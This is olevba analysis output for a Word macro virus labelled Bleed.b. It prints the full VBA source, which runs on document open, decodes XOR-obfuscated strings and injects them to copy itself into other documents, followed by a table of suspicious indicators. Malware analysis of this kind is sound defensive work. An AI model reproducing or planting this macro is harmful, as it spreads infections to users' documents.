olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bleed.b-f31ac18084f395537a488266c7ed7b6ca4d2ac6d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bleed.b-f31ac18084f395537a488266c7ed7b6ca4d2ac6d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Dim jacky(15) As String
jacky(1) = "Øù·Òååøå·Åòäâúò·Ùòïã­·Äòã·ò·ª·ÚöôåøÔøùãöþùòå­·ã·ª·¦"
jacky(2) = "ÄòãÖããå·ÙøåúöûÃòúçûöãò¹ÑâûûÙöúò»·áõÙøåúöû"
jacky(3) = "Äòã·à·ª·ò¹ÁÕÇåøýòôã­·Øçãþøùä¹ÁþåâäÇåøãòôãþøù·ª·¿Åùó·½·§¾­·Øçãþøùä¹ÄöáòÙøåúöûÇåøúçã·ª·¿Åùó·½·§¾"
jacky(4) = "Äòã·û·ª·à¹ÁÕÔøúçøùòùãä¿ã¾­·Äòã·ð·ª·û¹ÔøóòÚøóâûò"
jacky(5) = "Äòã·ä·ª·ÙøåúöûÃòúçûöãò­·Äòã·ãÿ·ª·ä¹ÁÕÇåøýòôã¹ÁÕÔøúçøùòùãä¿ã¾¹ÔøóòÚøóâûò"
jacky(6) = "õ·ª·ð¹ûþùòä¿ã»·¥¡¾·±·áõÔå·±·ð¹ûþùòä¿£¤»·¦¾"
jacky(7) = "Þñ·ò·ª·ä·Ãÿòù"
jacky(8) = "Äòã·ä·ª·ÖôãþáòÓøôâúòùã­·Äòã·ãÿ·ª·ä¹ÁÕÇåøýòôã¹ÁÕÔøúçøùòùãä¿ã¾¹ÔøóòÚøóâûò"
jacky(9) = "Òùó·Þñ"
jacky(10) = "Þñ·ãÿ¹ûþùòä¿ã»·ã¾·ª·§·Ãÿòù"
jacky(11) = "ãÿ¹ÓÒûÒãòÛÞùòÄ·ã»·ãÿ¹ôØâùãøñÛÞùÒä­·ãÿ¹ÖóóÑåøúÄãåþùð·õ"
jacky(12) = "Òùó·Þñ"
jacky(13) = "ÃÿþäÓøôâúòùã¹ÁÕÇåøýòôã¹ÁÕÔøúçøùòùãä¿ã¾¹ÔøóòÚøóâûò¹ÓÒûÒãòÛÞùòÄ·¥ »·¦¡"
jacky(14) = "Þñ·Óöî¿Ùøà¿¾¾·ª·¿Þùã¿Åùó·½·¦¢¾¾·Ãÿòù·ÚäðÕøï·µÔþöø·Äûöðòÿöúúòå¶·Ôøúò·äãöþ¨µ»·§»·µÔûöää¹Äûöðòÿöúúòå·ë·ýöôü·ãàøñûøàòå·¸·ÛþùòÍòå§·¸·Úòãöçÿöäòµ"
jacky(15) = "ÖôãþáòÓøôâúòùã¹ÄöáòÖä·ÖôãþáòÓøôâúòùã¹ÑâûûÙöúò"
For y = 1 To 15: V = V & dc(jacky(y), 151) & vbCr: Next
If ThisDocument.VBProject.VBComponents(1).CodeModule.lines(28, 1) = "" Then ThisDocument.VBProject.VBComponents(1).CodeModule.InsertLines 27, V
differ
End Sub
Private Function dc(a, e)
For i = 1 To Len(a): t = t & Chr(Asc(Mid(a, i, 1)) Xor e): Next i
dc = t
End Function
Private Sub differ()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

